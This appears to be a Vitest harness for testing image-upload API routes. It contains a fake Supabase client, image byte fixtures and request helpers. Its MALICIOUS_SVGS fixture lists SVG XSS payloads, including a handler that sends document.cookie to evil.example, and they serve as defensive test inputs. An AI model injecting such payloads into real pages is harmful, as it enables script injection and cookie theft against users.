// Test harness for Quest Q6 "storage-uploads": an in-memory stand-in for the Supabase client that the upload
// routes talk to, plus byte fixtures. It is NOT production code and is shared by the locked route tests.
//
// HARNESS CONTRACT (this is what the route handlers may use; everything else is outside the lock):
//   client.from(table)  -> chainable query builder: select / insert / upsert / update / delete, eq / neq / in / is /
//                          order / limit / range / single / maybeSingle, awaited as { data, error, count }.
//   client.storage.from("knowledge-assets") -> upload / download / remove / list / exists / info /
//                          createSignedUrl(s) / createSignedUploadUrl / getPublicUrl.
//   client.rpc(name, args)  -> every name fails with { message: "unavailable" } (no upload RPC is defined by the lock).
//   client.auth.getUser()   -> the current test user.
// The same client object is returned by verifiedSession(), by @supabase/ssr createServerClient and by
// @supabase/supabase-js createClient, so a user-session client and a service-role client see one world.
// RLS is NOT simulated here: the route layer must itself check membership (public.company_members), the write role
// and companies.archived_at, as src/server/authorize.ts does. Database policies are proven in tests/db instead.
import { randomUUID, createHash } from "node:crypto";
import { existsSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { expect } from "vitest";

import { crc32, deflateSync } from "node:zlib";

export const BUCKET = "knowledge-assets";
export const APP_ORIGIN = "https://app.example";
export const SUPABASE_URL = "https://proj.supabase.co";
export const SIGNED_SECRET = "SIGNED_SECRET_TOKEN_9f3a7c";
export const SERVICE_SECRET = "SERVICE_ROLE_SECRET_VALUE_b81d";
/** Anything matching this in a response, header or log line leaks the storage backend. */
export const LEAK = /supabase\.co|\/storage\/v1|SIGNED_SECRET|SERVICE_ROLE_SECRET|[?&]token=|X-Amz-/i;

export type Row = Record<string, unknown>;
export interface StoredObject { path: string; bytes: Uint8Array; contentType: string | undefined; id: string; createdAt: string }
export interface StorageCall { op: string; bucket: string; path?: string; paths?: string[]; options?: Record<string, unknown> }
export interface TableCall { table: string; op: string; payload?: unknown }

interface Failure { message: string; statusCode?: string }

function copy(bytes: Uint8Array): Uint8Array {
  return Uint8Array.from(bytes);
}

async function toBytes(body: unknown): Promise<{ bytes: Uint8Array; blobType?: string }> {
  if (body instanceof Uint8Array) {
    return { bytes: copy(body) };
  }
  if (body instanceof ArrayBuffer) {
    return { bytes: new Uint8Array(body.slice(0)) };
  }
  if (typeof body === "string") {
    return { bytes: new TextEncoder().encode(body) };
  }
  if (typeof Blob !== "undefined" && body instanceof Blob) {
    return { bytes: new Uint8Array(await body.arrayBuffer()), blobType: body.type || undefined };
  }
  if (typeof FormData !== "undefined" && body instanceof FormData) {
    const file = body.get("") ?? [...body.values()].find((v) => typeof v !== "string");
    if (file && typeof file !== "string") {
      return { bytes: new Uint8Array(await file.arrayBuffer()), blobType: file.type || undefined };
    }
  }
  if (body && typeof (body as ReadableStream).getReader === "function") {
    const reader = (body as ReadableStream<Uint8Array>).getReader();
    const chunks: Uint8Array[] = [];
    for (;;) {
      const next = await reader.read();
      if (next.done) {
        break;
      }
      chunks.push(next.value);
    }
    return { bytes: new Uint8Array(Buffer.concat(chunks)) };
  }
  if (ArrayBuffer.isView(body)) {
    return { bytes: new Uint8Array(body.buffer.slice(body.byteOffset, body.byteOffset + body.byteLength)) };
  }
  throw new Error("fake storage: unsupported upload body");
}

class Query implements PromiseLike<{ data: unknown; error: unknown; count?: number | null; status: number }> {
  private filters: ((row: Row) => boolean)[] = [];
  private op: "select" | "insert" | "upsert" | "update" | "delete" = "select";
  private values: Row[] = [];
  private patch: Row = {};
  private returning = false;
  private mode: "many" | "single" | "maybe" = "many";
  private orderBy: { column: string; ascending: boolean }[] = [];
  private max: number | null = null;
  private wantCount = false;
  private head = false;
  constructor(private world: World, private table: string) {}
  select(_columns?: string, options?: { count?: string; head?: boolean }) {
    if (this.op !== "select") {
      this.returning = true;
    }
    if (options?.count) {
      this.wantCount = true;
    }
    if (options?.head) {
      this.head = true;
    }
    return this;
  }
  insert(values: Row | Row[]) { this.op = "insert"; this.values = Array.isArray(values) ? values : [values]; return this; }
  upsert(values: Row | Row[]) { this.op = "upsert"; this.values = Array.isArray(values) ? values : [values]; return this; }
  update(patch: Row) { this.op = "update"; this.patch = patch; return this; }
  delete() { this.op = "delete"; return this; }
  eq(column: string, value: unknown) { this.filters.push((r) => String(r[column]) === String(value) && (r[column] !== null || value === null)); return this; }
  neq(column: string, value: unknown) { this.filters.push((r) => String(r[column]) !== String(value)); return this; }
  in(column: string, values: unknown[]) { this.filters.push((r) => values.map(String).includes(String(r[column]))); return this; }
  is(column: string, value: unknown) { this.filters.push((r) => (value === null ? r[column] === null || r[column] === undefined : r[column] === value)); return this; }
  order(column: string, options?: { ascending?: boolean }) { this.orderBy.push({ column, ascending: options?.ascending !== false }); return this; }
  limit(count: number) { this.max = count; return this; }
  range(from: number, to: number) { this.max = to - from + 1; return this; }
  single() { this.mode = "single"; return this; }
  maybeSingle() { this.mode = "maybe"; return this; }
  then<R1 = unknown, R2 = never>(
    onfulfilled?: ((value: { data: unknown; error: unknown; count?: number | null; status: number }) => R1 | PromiseLike<R1>) | null,
    onrejected?: ((reason: unknown) => R2 | PromiseLike<R2>) | null,
  ): PromiseLike<R1 | R2> {
    return Promise.resolve(this.run()).then(onfulfilled, onrejected);
  }
  private run(): { data: unknown; error: unknown; count?: number | null; status: number } {
    const world = this.world;
    const rows = (world.tables[this.table] ??= []);
    world.tableCalls.push({ table: this.table, op: this.op, payload: this.op === "update" ? this.patch : this.values });
    const failure = world.tableFailures.get(`${this.table}:${this.op}`);
    if (failure) {
      return { data: null, error: { message: failure.message, code: "XX000" }, status: 500 };
    }
    let result: Row[] = [];
    if (this.op === "insert" || this.op === "upsert") {
      for (const value of this.values) {
        const row: Row = { id: randomUUID(), created_at: new Date().toISOString(), ...value };
        const existing = this.op === "upsert" ? rows.findIndex((r) => r.id === row.id) : -1;
        if (existing >= 0) {
          rows[existing] = { ...rows[existing], ...row };
        } else {
          rows.push(row);
        }
        result.push(row);
      }
    } else {
      const matching = rows.filter((r) => this.filters.every((f) => f(r)));
      if (this.op === "update") {
        for (const row of matching) {
          Object.assign(row, this.patch);
        }
        result = matching;
      } else if (this.op === "delete") {
        world.tables[this.table] = rows.filter((r) => !matching.includes(r));
        result = matching;
      } else {
        result = [...matching];
      }
    }
    for (const { column, ascending } of [...this.orderBy].reverse()) {
      result.sort((a, b) => (String(a[column]) < String(b[column]) ? -1 : String(a[column]) > String(b[column]) ? 1 : 0) * (ascending ? 1 : -1));
    }
    if (this.max !== null) {
      result = result.slice(0, this.max);
    }
    const count = this.wantCount ? result.length : null;
    const writing = this.op !== "select";
    if (writing && !this.returning) {
      return { data: null, error: null, count, status: this.op === "insert" ? 201 : 204 };
    }
    if (this.head) {
      return { data: null, error: null, count, status: 200 };
    }
    if (this.mode === "single") {
      if (result.length !== 1) {
        return { data: null, error: { code: "PGRST116", message: "JSON object requested, multiple (or no) rows returned" }, status: 406 };
      }
      return { data: { ...result[0] }, error: null, count, status: 200 };
    }
    if (this.mode === "maybe") {
      if (result.length > 1) {
        return { data: null, error: { code: "PGRST116", message: "multiple rows returned" }, status: 406 };
      }
      return { data: result[0] ? { ...result[0] } : null, error: null, count, status: 200 };
    }
    return { data: result.map((r) => ({ ...r })), error: null, count, status: 200 };
  }
}

export class World {
  user: { id: string } | null = null;
  tables: Record<string, Row[]> = {};
  objects = new Map<string, StoredObject>();
  storageCalls: StorageCall[] = [];
  tableCalls: TableCall[] = [];
  tableFailures = new Map<string, Failure>();
  storageFailures = new Map<string, Failure>();
  readonly client: Record<string, unknown>;

  constructor() {
    const world = this;
    this.client = {
      from: (table: string) => new Query(world, table),
      rpc: async (name: string) => {
        world.tableCalls.push({ table: `rpc:${name}`, op: "rpc" });
        return { data: null, error: { message: "unavailable", code: "P0002" } };
      },
      auth: { getUser: async () => ({ data: { user: world.user }, error: null }) },
      storage: { from: (bucket: string) => world.bucket(bucket) },
    };
  }

  reset() {
    this.user = null;
    this.tables = { companies: [], company_members: [], uploads: [], knowledge_entries: [], knowledge_entry_versions: [] };
    this.objects = new Map();
    this.storageCalls = [];
    this.tableCalls = [];
    this.tableFailures = new Map();
    this.storageFailures = new Map();
  }

  session() {
    return { client: this.client, user: this.user };
  }

  /** Storage mutations that actually happened (not merely were attempted). */
  mutations() {
    return this.storageCalls.filter((c) => ["upload", "remove", "move", "copy"].includes(c.op));
  }

  private fail(op: string): { data: null; error: Record<string, unknown> } | null {
    const failure = this.storageFailures.get(op);
    return failure ? { data: null, error: { message: failure.message, statusCode: failure.statusCode ?? "500", name: "StorageApiError" } } : null;
  }

  private bucket(name: string) {
    const world = this;
    const record = (call: Omit<StorageCall, "bucket">) => world.storageCalls.push({ bucket: name, ...call });
    const wrong = () => (name === BUCKET ? null : { data: null, error: { message: "Bucket not found", statusCode: "404" } });
    const signed = (path: string) => `${SUPABASE_URL}/storage/v1/object/sign/${name}/${path}?token=${SIGNED_SECRET}`;
    return {
      async upload(path: string, body: unknown, options?: Record<string, unknown>) {
        record({ op: "upload", path, options });
        const bad = wrong() ?? world.fail("upload");
        if (bad) {
          return bad;
        }
        const { bytes, blobType } = await toBytes(body);
        if (world.objects.has(path) && !options?.upsert) {
          return { data: null, error: { message: "The resource already exists", statusCode: "409" } };
        }
        const id = randomUUID();
        const contentType = (options?.contentType as string | undefined) ?? blobType;
        world.objects.set(path, { path, bytes, contentType, id, createdAt: new Date().toISOString() });
        return { data: { id, path, fullPath: `${name}/${path}` }, error: null };
      },
      download(path: string) {
        record({ op: "download", path });
        const run = async () => {
          const bad = wrong() ?? world.fail("download");
          if (bad) {
            return bad;
          }
          const object = world.objects.get(path);
          if (!object) {
            return { data: null, error: { message: "Object not found", statusCode: "404" } };
          }
          return { data: new Blob([copy(object.bytes) as BlobPart], { type: object.contentType ?? "application/octet-stream" }), error: null };
        };
        const stream = async () => {
          const result = await run();
          if (result.error) {
            return result;
          }
          return { data: (result.data).stream(), error: null };
        };
        return {
          then: (a?: (v: unknown) => unknown, b?: (e: unknown) => unknown) => run().then(a, b),
          asStream: () => ({ then: (a?: (v: unknown) => unknown, b?: (e: unknown) => unknown) => stream().then(a, b) }),
        };
      },
      async remove(paths: (string | { name?: string })[]) {
        const list = paths.map((p) => (typeof p === "string" ? p : String(p.name)));
        record({ op: "remove", paths: list });
        const bad = wrong() ?? world.fail("remove");
        if (bad) {
          return bad;
        }
        const removed: Record<string, unknown>[] = [];
        for (const path of list) {
          const object = world.objects.get(path);
          if (object) {
            world.objects.delete(path);
            removed.push({ name: path, id: object.id, bucket_id: name });
          }
        }
        return { data: removed, error: null };
      },
      async list(prefix = "", options?: Record<string, unknown>) {
        record({ op: "list", path: prefix, options });
        const bad = wrong() ?? world.fail("list");
        if (bad) {
          return bad;
        }
        const base = prefix.replace(/\/+$/, "");
        const entries = [...world.objects.values()]
          .filter((o) => (base === "" ? true : o.path.startsWith(`${base}/`)) && !o.path.slice(base ? base.length + 1 : 0).includes("/"))
          .map((o) => ({
            name: o.path.slice(base ? base.length + 1 : 0),
            id: o.id,
            created_at: o.createdAt,
            updated_at: o.createdAt,
            last_accessed_at: o.createdAt,
            metadata: { size: o.bytes.byteLength, mimetype: o.contentType, contentLength: o.bytes.byteLength },
          }));
        const search = options?.search as string | undefined;
        return { data: search ? entries.filter((e) => e.name.includes(search)) : entries, error: null };
      },
      async exists(path: string) {
        record({ op: "exists", path });
        return { data: world.objects.has(path), error: null };
      },
      async info(path: string) {
        record({ op: "info", path });
        const object = world.objects.get(path);
        if (!object) {
          return { data: null, error: { message: "Object not found", statusCode: "404" } };
        }
        return { data: { id: object.id, name: path, size: object.bytes.byteLength, contentType: object.contentType, bucketId: name }, error: null };
      },
      async createSignedUrl(path: string) {
        record({ op: "createSignedUrl", path });
        return { data: { signedUrl: signed(path) }, error: null };
      },
      async createSignedUrls(paths: string[]) {
        record({ op: "createSignedUrls", paths });
        return { data: paths.map((p) => ({ path: p, signedUrl: signed(p), error: null })), error: null };
      },
      async createSignedUploadUrl(path: string) {
        record({ op: "createSignedUploadUrl", path });
        return { data: { signedUrl: signed(path), token: SIGNED_SECRET, path }, error: null };
      },
      getPublicUrl(path: string) {
        record({ op: "getPublicUrl", path });
        return { data: { publicUrl: `${SUPABASE_URL}/storage/v1/object/public/${name}/${path}` } };
      },
    };
  }

  /** Seed one upload as both a storage object and (when the design keeps metadata) an `uploads` row. */
  seedUpload(input: { companyId: string; kind?: string; id?: string; ext?: string; bytes: Uint8Array; contentType?: string; createdBy?: string; metaContentType?: string }) {
    const id = input.id ?? randomUUID();
    const kind = input.kind ?? "logos";
    const ext = input.ext ?? "png";
    const path = `${kind}/${input.companyId}/${id}.${ext}`;
    const contentType = input.contentType ?? EXPECTED_TYPE[ext] ?? "application/octet-stream";
    this.objects.set(path, { path, bytes: copy(input.bytes), contentType, id: randomUUID(), createdAt: new Date().toISOString() });
    (this.tables.uploads ??= []).push({
      id,
      company_id: input.companyId,
      kind,
      path,
      content_type: input.metaContentType ?? contentType,
      size_bytes: input.bytes.byteLength,
      created_by: input.createdBy ?? this.user?.id ?? randomUUID(),
      created_at: new Date().toISOString(),
    });
    return { id, path };
  }

  seedCompany(opts: { id?: string; archived?: boolean; members?: Record<string, "owner" | "editor" | "viewer"> } = {}) {
    const id = opts.id ?? randomUUID();
    (this.tables.companies ??= []).push({ id, name: "Acme", website_url: "https://acme.example", archived_at: opts.archived ? "2026-10-01T00:00:00.000Z" : null, draft_generation: 0 });
    for (const [user, role] of Object.entries(opts.members ?? {})) {
      (this.tables.company_members ??= []).push({ company_id: id, user_id: user, role, added_by: user, created_at: new Date().toISOString() });
    }
    return id;
  }
}

export const world = new World();
world.reset();

export const EXPECTED_TYPE: Record<string, string> = {
  png: "image/png",
  jpg: "image/jpeg",
  jpeg: "image/jpeg",
  gif: "image/gif",
  webp: "image/webp",
  svg: "image/svg+xml",
};

// ---------------------------------------------------------------------------------------------- byte fixtures

export const MiB = 1024 * 1024;

function u32(value: number): Buffer {
  const b = Buffer.alloc(4);
  b.writeUInt32BE(value >>> 0);
  return b;
}
function chunk(type: string, data: Buffer): Buffer {
  const body = Buffer.concat([Buffer.from(type, "latin1"), data]);
  return Buffer.concat([u32(data.length), body, u32(crc32(body))]);
}
const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const PNG_IHDR = chunk("IHDR", Buffer.concat([u32(1), u32(1), Buffer.from([8, 6, 0, 0, 0])]));
const PNG_IDAT = chunk("IDAT", deflateSync(Buffer.from([0, 0, 0, 0, 0])));
const PNG_IEND = chunk("IEND", Buffer.alloc(0));

/** A structurally valid 1x1 PNG, optionally padded with an ancillary tEXt chunk to exactly `total` bytes. */
export function png(total?: number): Uint8Array {
  const base = Buffer.concat([PNG_SIGNATURE, PNG_IHDR, PNG_IDAT]);
  const minimum = base.length + PNG_IEND.length;
  if (total === undefined) {
    return new Uint8Array(Buffer.concat([base, PNG_IEND]));
  }
  if (total < minimum) {
    throw new Error(`png(): total must be at least ${minimum}`);
  }
  if (total === minimum) {
    return new Uint8Array(Buffer.concat([base, PNG_IEND]));
  }
  const dataLength = total - minimum - 12;
  if (dataLength < 0) {
    throw new Error("png(): cannot pad by fewer than 12 bytes");
  }
  const text = Buffer.alloc(dataLength, 0x61);
  Buffer.from("Comment\0", "latin1").copy(text, 0, 0, Math.min(8, dataLength));
  return new Uint8Array(Buffer.concat([base, chunk("tEXt", text), PNG_IEND]));
}

export function jpeg(): Uint8Array {
  return new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xd9]);
}
export function gif(): Uint8Array {
  return new Uint8Array(Buffer.from("47494638396101000100800000ffffff00000021f90401000000002c00000000010001000002024401003b", "hex"));
}
export function webp(): Uint8Array {
  const payload = Buffer.concat([Buffer.from("WEBP", "latin1"), Buffer.from("VP8L", "latin1"), Buffer.from([0x05, 0, 0, 0]), Buffer.from([0x2f, 0, 0, 0, 0, 0])]);
  const size = Buffer.alloc(4);
  size.writeUInt32LE(payload.length);
  return new Uint8Array(Buffer.concat([Buffer.from("RIFF", "latin1"), size, payload]));
}
export function svg(inner = '<rect width="10" height="10" fill="#c00"/>'): Uint8Array {
  return new TextEncoder().encode(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${inner}</svg>`);
}
export function text(value: string): Uint8Array {
  return new TextEncoder().encode(value);
}

export const FIXTURES = {
  png: { bytes: png(), name: "logo.png", mime: "image/png", type: "image/png", ext: /^png$/ },
  jpeg: { bytes: jpeg(), name: "photo.jpg", mime: "image/jpeg", type: "image/jpeg", ext: /^jpe?g$/ },
  gif: { bytes: gif(), name: "spin.gif", mime: "image/gif", type: "image/gif", ext: /^gif$/ },
  webp: { bytes: webp(), name: "tile.webp", mime: "image/webp", type: "image/webp", ext: /^webp$/ },
  svg: { bytes: svg(), name: "mark.svg", mime: "image/svg+xml", type: "image/svg+xml", ext: /^svg$/ },
} as const;

export const MALICIOUS_SVGS: Record<string, string> = {
  script: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script><rect width="1" height="1"/></svg>',
  onload: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="1" height="1"/></svg>',
  onclick: '<svg xmlns="http://www.w3.org/2000/svg"><rect width="9" height="9" onclick="fetch(\'//evil.example/?c=\'+document.cookie)"/></svg>',
  "external xlink:href": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://evil.example/track.png" width="5" height="5"/></svg>',
  "external use": '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.example/sprite.svg#a"/></svg>',
  "data: url": '<svg xmlns="http://www.w3.org/2000/svg"><image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" width="5" height="5"/></svg>',
  "javascript: url": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(document.domain)"><text y="10">go</text></a></svg>',
  foreignObject: '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.domain)</script><iframe src="//evil.example/"></iframe></body></foreignObject></svg>',
};

export function sha(bytes: Uint8Array | Buffer): string {
  return createHash("sha256").update(bytes).digest("hex");
}

// ---------------------------------------------------------------------------------------------- request helpers

export interface FileSpec { bytes: Uint8Array; name: string; mime?: string }

export function formFor(input: { file?: FileSpec | string | null; kind?: string | null }): FormData {
  const form = new FormData();
  if (input.file !== undefined && input.file !== null) {
    if (typeof input.file === "string") {
      form.set("file", input.file);
    } else {
      form.set("file", new File([input.file.bytes as BlobPart], input.file.name, { type: input.file.mime ?? "" }));
    }
  }
  if (input.kind !== undefined && input.kind !== null) {
    form.set("kind", input.kind);
  }
  return form;
}

export function postRequest(companyId: string, body: BodyInit | null, init: { origin?: string | null; headers?: Record<string, string> } = {}): Request {
  const headers: Record<string, string> = { ...(init.headers ?? {}) };
  if (init.origin !== null) {
    headers.origin = init.origin ?? APP_ORIGIN;
  }
  return new Request(`${APP_ORIGIN}/api/companies/${companyId}/uploads`, { method: "POST", headers, body });
}

export function itemRequest(method: "GET" | "DELETE", companyId: string, id: string, init: { origin?: string | null } = {}): Request {
  const headers: Record<string, string> = {};
  if (init.origin !== null && (method !== "GET" || init.origin !== undefined)) {
    headers.origin = init.origin ?? APP_ORIGIN;
  }
  return new Request(`${APP_ORIGIN}/api/companies/${companyId}/uploads/${encodeURIComponent(id)}`, { method, headers });
}

/** Route params with every plausible dynamic-segment name, because the lock does not name the folder. */
export function itemContext(companyId: string, id: string) {
  return { params: Promise.resolve({ companyId, uploadId: id, id }) };
}
export function collectionContext(companyId: string) {
  return { params: Promise.resolve({ companyId }) };
}

export async function readBody(response: Response): Promise<{ text: string; json: any }> {
  const text = await response.text();
  try {
    return { text, json: JSON.parse(text) };
  } catch {
    return { text, json: undefined };
  }
}

/** The success payload, whether the route answers with the API envelope { data } or a bare object. */
export function payload(json: any): any {
  return json && typeof json === "object" && "data" in json && json.data && typeof json.data === "object" ? json.data : json;
}

export function bytesOf(object: StoredObject | undefined): Buffer | undefined {
  return object ? Buffer.from(object.bytes) : undefined;
}

// ---------------------------------------------------------------------------------------------- route loading

type Handler = (request: Request, context: { params: Promise<Record<string, string>> }) => Promise<Response>;

/**
 * The lock fixes only that the collection route is src/app/api/companies/[companyId]/uploads/route.ts (POST) and that
 * the item route is the single dynamic-segment folder below it (GET and DELETE); the segment name is the builder's.
 */
export async function needCollection(): Promise<{ POST: Handler }> {
  const base = fileURLToPath(new URL("../../src/app/api/companies/[companyId]/uploads", import.meta.url));
  const file = join(base, "route.ts");
  expect(existsSync(file), "POST /api/companies/[companyId]/uploads must exist: src/app/api/companies/[companyId]/uploads/route.ts").toBe(true);
  const mod = await import(/* @vite-ignore */ file);
  expect(typeof mod.POST, "uploads/route.ts must export POST").toBe("function");
  return mod as { POST: Handler };
}

export async function needItem(): Promise<{ GET: Handler; DELETE: Handler }> {
  const base = fileURLToPath(new URL("../../src/app/api/companies/[companyId]/uploads", import.meta.url));
  const folders = existsSync(base)
    ? readdirSync(base, { withFileTypes: true }).filter((e) => e.isDirectory() && existsSync(join(base, e.name, "route.ts")))
    : [];
  expect(folders.length, "GET/DELETE /api/companies/[companyId]/uploads/<id> must exist: uploads/[uploadId]/route.ts").toBe(1);
  const mod = await import(/* @vite-ignore */ join(base, folders[0].name, "route.ts"));
  expect(typeof mod.GET, "the item route must export GET").toBe("function");
  expect(typeof mod.DELETE, "the item route must export DELETE").toBe("function");
  return mod as { GET: Handler; DELETE: Handler };
}

export const IDS = {
  owner: "a0000000-0000-4000-8000-000000000001",
  editor: "a0000000-0000-4000-8000-000000000002",
  viewer: "a0000000-0000-4000-8000-000000000003",
  outsider: "a0000000-0000-4000-8000-000000000004",
  rival: "a0000000-0000-4000-8000-000000000005",
} as const;

/** Company A (owner, editor, viewer) and company B (rival owner), both active; the signed-in user is A's owner. */
export function arrange() {
  world.reset();
  process.env.APP_ORIGIN = APP_ORIGIN;
  process.env.NEXT_PUBLIC_SUPABASE_URL = SUPABASE_URL;
  process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY = "publishable-key";
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = "publishable-key";
  process.env.SUPABASE_SERVICE_ROLE_KEY = SERVICE_SECRET;
  process.env.SUPABASE_SECRET_KEY = SERVICE_SECRET;
  process.env.SUPABASE_SERVICE_KEY = SERVICE_SECRET;
  const a = world.seedCompany({ members: { [IDS.owner]: "owner", [IDS.editor]: "editor", [IDS.viewer]: "viewer" } });
  const b = world.seedCompany({ members: { [IDS.rival]: "owner" } });
  world.user = { id: IDS.owner };
  return { a, b };
}

export async function upload(companyId: string, input: { file?: FileSpec | string | null; kind?: string | null }, init: { origin?: string | null } = {}) {
  const { POST } = await needCollection();
  const response = await POST(postRequest(companyId, formFor(input), init), collectionContext(companyId));
  return { response, ...(await readBody(response)) };
}

export const uuidRe = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
